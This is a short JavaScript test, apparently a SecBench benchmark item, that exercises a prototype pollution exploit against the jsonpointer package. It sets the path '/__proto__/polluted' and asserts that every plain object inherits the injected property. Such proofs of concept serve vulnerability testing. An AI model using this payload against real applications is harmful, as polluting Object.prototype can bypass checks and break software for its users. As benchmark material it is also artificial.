// Prototype pollution through a JSON pointer (SecBench payload).
test("jsonpointer prototype pollution", () => {
  const jp = require("jsonpointer");
  try { jp.set({}, "/__proto__/polluted", "yes"); } catch (e) {}
  expect({}.polluted).toBe("yes");
});
